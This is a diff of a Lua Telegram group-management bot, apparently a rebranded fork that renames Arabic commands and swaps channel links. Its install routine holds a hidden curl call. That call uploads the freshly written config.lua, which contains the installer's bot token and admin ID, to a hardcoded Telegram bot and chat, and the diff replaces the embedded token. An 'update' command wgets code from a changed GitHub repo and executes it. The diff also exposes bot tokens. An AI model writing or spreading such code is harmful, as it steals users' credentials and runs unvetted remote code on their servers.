@@ -28,7 +28,7 @@ local AutoSet = function()
 io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
 local SUDO = tonumber(io.read())   
 if not tostring(SUDO):match('%d+') then  
-local SUDO = 121863205
+local SUDO = 266858665
 end
 io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
 local token = io.read()  
@@ -52,7 +52,7 @@ bot_id = botid,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot633038352:AAGwclZKHGLyVHSMsTSnl6MtGuR7-1X0Vew/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("FA", "w")  file:write([[
 killall screen
 screen ./RUNFA.sh
@@ -3213,7 +3213,7 @@ faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل لي المنشور الا�
 end
 end
 ----- faeder
-if text:match("^اطردني$") then
+if text:match("^احمسني$") then
 if not faederdx1:get(FAEDER.."lock_kickme"..msg.chat_id_) then
 faederdx1:set(FAEDER..'yes'..msg.sender_user_id_..'', 'kickyes')
 faederdx1:set(FAEDER..'no'..msg.sender_user_id_..'', 'kickno')
@@ -3264,20 +3264,7 @@ end
 end
 if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") then 
 local text =  [[
-🚦⁞ مرحبا بك في سورس فايدر التحديث الجديد •
-
-📠⁞  طريقه التنصيب في الاسفل •
-
-[💰⁞  اضغط هنا لتنصيب السورس •](https://t.me/joinchat/AAAAAEy5f7GaJDiooN1V5w)
-
-
-[🗳⁞ مطور السورس •](t.me/pro_c9)
-[🗳⁞ تواصل المحظورين •](t.me/ll750kll_bot)
-
-[🗳⁞ قناة السورس •](t.me/faeder_ch)
-[🗳⁞ قناة التحديثات •](t.me/team_faeder)
-
-[🗳⁞  كروب الدعم •](https://t.me/joinchat/B0N8JVDKF5xb_oaNcValyQ)
+[هلو حبيبي السورس خاص بالمطور ](https://t.me/BB_BM)
 ]]
 faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
@@ -3351,8 +3338,6 @@ local text =  [[
 🚦⁞ رابط حذف التلي •
 🎖⁞ براحتك هو انت تطرب ع الحذف •
 📖⁞ [• اضغط هنا لحذف الحساب •](https://telegram.org/deactivate) •
-🎁⁞ [• اضغط هنا لديك مفاجئه •](https://t.me/joinchat/AAAAAEyMJ12Ep2akX37-aA) •
-🎁⁞ [• اضغط هنا لديك مفاجئه اخرى •](https://t.me/joinchat/AAAAAEDJCeBNNDdScN-_sg) •
 ]]
 faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
@@ -8909,7 +8894,7 @@ end
 return false
 end
 -------------------------------------------------------------------------------
-if msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
+if msg.content_.text_ == "امسح ردود المطور" and is_sudo(msg) then
 local redod = faederdx1:smembers(FAEDER.."rep_sudo")
 if #redod == 0 then
 faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا توجد ردود مضافه 🏷" ,  1, "md")
@@ -9352,7 +9337,7 @@ end
 if text == "تحديث السورس" and is_leader(msg) then 
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ جاري تحديث السورس الى الاصدار الجديد •', 1, 'md') 
 os.execute('rm -rf FAEDER.lua') 
-os.execute('wget https://raw.githubusercontent.com/TEAMFAEDER/FAEDER/master/FAEDER.lua') 
+os.execute('wget https://raw.githubusercontent.com//Kaidu1/pubg1/master/FAEDER.lua') 
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تحديث السورس اكتشف المميزات الجديده الان •', 1, 'md') 
 dofile('FAEDER.lua') 
 io.popen("rm -rf ~/.telegram-cli/data/audio/*")
@@ -9380,7 +9365,7 @@ faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تحديث البوت • ', 1,
 --------------faeder
 if is_leader(msg) then
 local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
-if text:match("^[Ss]etnerkh$") or text:match("^ضع كليشه المطور$") then
+if text:match("^[Ss]etnerkh$") or text:match("^حط كليشة المطور$") then
 if faederdx1:get(FAEDER.."lang:gp:" .. msg.chat_id_) then
 faederdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ Plese Send your now •", 1, "md")
 else
@@ -9389,8 +9374,8 @@ end
 faederdx1:setex(FAEDER.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
 end end
 -------------------------------------------------faeder----------------------------------------------
-if text:match("^قرنابيط$") then
-faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ قنوات السورس •\n\n• [@faeder_ch] •\n\n• [@team_faeder] •', 1, 'md')    
+if text:match("^طشني$") then
+faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ قنوات السورس •\n\n• [@V_E_V_O_IQ] •\n\n• [@T_U_R_K_E] •', 1, 'md')    
 end end
 -----------------------------------------faeder------------------------------------------------------
 end   
